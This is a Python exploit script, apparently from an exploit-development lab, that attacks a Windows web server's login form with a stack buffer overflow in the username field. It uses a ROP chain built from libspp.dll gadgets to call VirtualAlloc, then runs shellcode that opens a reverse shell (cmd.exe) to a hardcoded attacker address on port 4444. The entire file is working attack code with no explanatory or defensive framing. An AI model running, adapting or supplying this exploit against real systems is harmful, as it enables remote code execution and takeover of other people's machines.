virtual_alloc_address = 0x76d4ff00
bad_chars_2 = 0x00,0x0a,0x0d,0x25,0x26,0x3d
import struct
import socket
import sys
try:
  server = sys.argv[1] 
  port = 80
  size = 800
  crash_eip = 780


  nop_chain = b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

  shellcode = b"\x89\xe5\x81\xc4\xf0\xf9\xff\xff\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x5e\x08\x8b\x7e\x20\x8b\x36\x66\x39\x4f\x18\x75\xf2\x74\x06\x5e\x89\x75\x04\x74\x5f\xe8\xf5\xff\xff\xff\x60\x8b\x43\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x41\x49\x8b\x45\xfc\x8b\x34\x88\x01\xde\x31\xc0\x99\xfc\xac\x84\xc0\x74\x12\x50\x51\x31\xc9\x80\xc1\x06\x80\xc1\x07\xd3\xca\x59\x58\x01\xc2\x75\xe9\x3b\x54\x24\x24\x75\xd4\x8b\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c\x61\xc3\x68\x83\xb9\xb5\x78\xff\x55\x04\x89\x45\x10\x68\x8e\x4e\x0e\xec\xff\x55\x04\x89\x45\x14\x68\x72\xfe\xb3\x16\xff\x55\x04\x89\x45\x18\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x33\x32\x2e\x64\x68\x77\x73\x32\x5f\x54\xff\x55\x14\x89\xc3\x68\xcb\xed\xfc\x3b\xff\x55\x04\x89\x45\x1c\x68\xd9\x09\xf5\xad\xff\x55\x04\x89\x45\x20\x68\x0c\xba\x2d\xb3\xff\x55\x04\x89\x45\x24\x89\xe0\x66\xb9\x90\x05\x29\xc8\x50\x31\xc0\x66\xb8\x02\x02\x50\xff\x55\x1c\x31\xc0\x50\x50\x50\xb0\x06\x50\x2c\x05\x50\x40\x50\xff\x55\x20\x89\xc6\x31\xc0\x50\x50\x68\xc0\xa8\x2d\xf9\x66\xb8\x11\x5c\xc1\xe0\x10\x66\x83\xc0\x02\x50\x54\x5f\x31\xc0\x50\x50\x50\x50\x04\x10\x50\x57\x56\xff\x55\x24\x56\x56\x56\x31\xc0\x50\x50\xb0\x80\x31\xc9\xb1\x80\x01\xc8\x50\x31\xc0\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\xb0\x44\x50\x54\x5f\xb8\x9b\x87\x9a\xff\xf7\xd8\x50\x68\x63\x6d\x64\x2e\x54\x5b\x89\xe0\x31\xc9\x66\xb9\x90\x03\x29\xc8\x50\x57\x31\xc0\x50\x50\x50\x40\x50\x48\x50\x50\x53\x50\xff\x55\x18\x31\xc9\x51\x6a\xff\xff\x55\x10"

    # skeleton += 0x41414141               
    # skeleton += 0x42424242                
    # skeleton += 0x43434343                
    # skeleton += 0x44444444                
    # skeleton += 0x45454545                
    # skeleton += 0x46464646                
  #valloc skeleton.
  skeleton_valloc = struct.pack("<L",0x41414141)                 # VirtualAlloc address
  skeleton_valloc += struct.pack("<L",0x42424242)                # shellcode return address to return to after VirtualAlloc is called
  skeleton_valloc += struct.pack("<L",0x43434343)                # lpAddress (shellcode address)
  skeleton_valloc += struct.pack("<L",0x44444444)                # dwSize (0x1)
  skeleton_valloc += struct.pack("<L",0x45454545)                # flAllocationType (0x1000)
  skeleton_valloc += struct.pack("<L",0x46464646)                # flProtect (0x40)
  # -------------------------     


  padding = b"A" * (crash_eip-(len(skeleton_valloc)))


  # Getting esp in a register
  
  rop_chain_valloc = struct.pack("<L",0x10154112)# push esp; inc ecx; adc eax, 0x08468B10; pop esi; ret
  rop_chain_valloc += struct.pack("<L",0xffffffff) # junk esi.
  rop_chain_valloc += struct.pack("<L",0x10132e5a)  # mov eax, esi; pop esi; pop ebx; ret 
  rop_chain_valloc += struct.pack("<L",0xffffffff) # esi holds this
  rop_chain_valloc += struct.pack("<L",0xffffffff)  # ebx holds this.  
  rop_chain_valloc += struct.pack("<L",0x100baecb)  # xchg ecx, eax; ret;
  rop_chain_valloc += struct.pack("<L",0x1002f729) # pop eax; ret;


  ## making ecx point to my skeleton to patch
  rop_chain_valloc += (struct.pack("<L",0x100fcd73)) *33 # dec ecx by 32

  #patching 41414141 placeholder -> which is the virtual alloc place holder
  rop_chain_valloc += struct.pack("<L",0x1002f729)  # pop eax; ret;
  rop_chain_valloc += struct.pack("<L",0x76d4fefc) # valloc address.
  rop_chain_valloc += struct.pack( "<L",0x10023688)*4  # inc eax; ret;
  rop_chain_valloc += struct.pack( "<L",0x100cb4d4)  # xchg edx, eax; ret;
  rop_chain_valloc += struct.pack("<L",0x101401cf)  # mov dword ptr [ecx], edx; ret;
  rop_chain_valloc += struct.pack("<L",0x100284be)  # mov eax, ecx; ret;
  # i need to write stack addy to a reg here.
  rop_chain_valloc += struct.pack("<L",0x10125f85)  # xchg edi, eax; ret;

  #41414141 placeholder now holds the call to virtualAlloc.

  #edi holds valloc address for reference 
  
  #patching the 0x42424242 
  rop_chain_valloc += struct.pack("<L",0x1010adf1)* 4  # inc ecx; ret;
  rop_chain_valloc += struct.pack("<L",0x1002f729)  # pop eax; ret;
  rop_chain_valloc += struct.pack("<L",0x3b08411d)  # eax now holds this.-> replace with place holder for memcpy call
  rop_chain_valloc += struct.pack("<L",0x10058e03)  # xor eax, 0x3b08408b; ret;  :: libspp.dll
  
  #eax holds 196 , ecx holds my address that I want to add to..

  rop_chain_valloc += struct.pack("<L",0x100baecb)  # xchg ecx, eax; ret;  :: libspp.dll
  rop_chain_valloc += struct.pack("<L",0x100cb4d4)  # xchg edx, eax; ret;  :: libspp.dll)  
  rop_chain_valloc += struct.pack("<L",0x100baecb)  # xchg ecx, eax; ret;  :: libspp.dll
  rop_chain_valloc += struct.pack("<L",0x1003f9f9)  # add eax, edx; retn 0x0004
  rop_chain_valloc += struct.pack("<L",0x100cb4d4)  # xchg edx, eax; ret;
  rop_chain_valloc += struct.pack("<L",0x100baecb)  # xchg ecx, eax; ret
  rop_chain_valloc += struct.pack("<L",0x100baecb)  # xchg ecx, eax; ret
  rop_chain_valloc += struct.pack("<L",0x101401cf)  # mov dword ptr [ecx], edx; ret;

  #patching the 0x43434343 -> 
  rop_chain_valloc += struct.pack("<L",0x1010adf1) * 4  # inc ecx; ret;
  rop_chain_valloc += struct.pack("<L",0x101401cf)  # mov dword ptr [ecx], edx; ret;

  #patching the 0x44444444 -> dW size to 0x1
  rop_chain_valloc += struct.pack("<L",0x1010adf1) * 4 # inc ecx; ret;
  rop_chain_valloc += struct.pack("<L",0x100122b5)  # xor edx, edx; ret;
  rop_chain_valloc += struct.pack("<L",0x100bb1f4)  # inc edx; ret;
  rop_chain_valloc += struct.pack("<L",0x101401cf)  # mov dword ptr [ecx], edx; ret

  #patching the 0x45454545 fffff667 - setting to 0x1000
  rop_chain_valloc += struct.pack("<L",0x1010adf1) * 4  # inc ecx; ret;
  rop_chain_valloc += struct.pack("<L",0x1002f729)  # pop eax; ret;
  rop_chain_valloc += struct.pack("<L",0xffffefff)  #
  rop_chain_valloc += struct.pack("<L",0x1005a3e6)  # neg eax; ret;
  rop_chain_valloc += struct.pack( "<L",0x1001181d)  # dec eax; ret;  :: libspp.dll
  rop_chain_valloc += struct.pack( "<L",0x100cb4d4)  # xchg edx, eax;
  rop_chain_valloc += struct.pack("<L",0x101401cf)  # mov dword ptr [ecx], edx; ret;   


  #patching the 0x46464646   ffffffc0 -> 0x40
  rop_chain_valloc += struct.pack("<L",0x1010adf1) * 4  # inc ecx; ret;
  rop_chain_valloc += struct.pack("<L",0x1002f729)  # pop eax; ret;
  rop_chain_valloc += struct.pack("<L",0xffffffc0)  #
  rop_chain_valloc += struct.pack("<L",0x1005a3e6)  # neg eax; ret;
  rop_chain_valloc += struct.pack( "<L",0x100cb4d4)  # xchg edx, eax;
  rop_chain_valloc += struct.pack("<L",0x101401cf)  # mov dword ptr [ecx], edx; ret;
  rop_chain_valloc += struct.pack("<L",0x10125f85)  # xchg edi, eax; ret;
  rop_chain_valloc += struct.pack("<L",0x101394a9)  # xchg esp, eax; ret;  :: libspp.dll


  inputBuffer = padding + skeleton_valloc + rop_chain_valloc + nop_chain + shellcode
  content = b"username=" + inputBuffer + b"&password=A"
  buffer = b"POST /login HTTP/1.1\r\n"
  buffer += b"Host: " + server.encode() + b"\r\n"
  buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += b"Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
  buffer += b"Referer: http://10.11.0.22/login\r\n"
  buffer += b"Connection: close\r\n"
  buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
  buffer += b"\r\n"
  buffer += content  

  print("Length of Input buffer %d" %(len(inputBuffer)))
#  print(inputBuffer)  
  print("Length of nops and shellcode %d"%(len(nop_chain)+len(shellcode)))  
  
  
  
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buffer)
  s.close()
except socket.error:
   print("Could not connect!")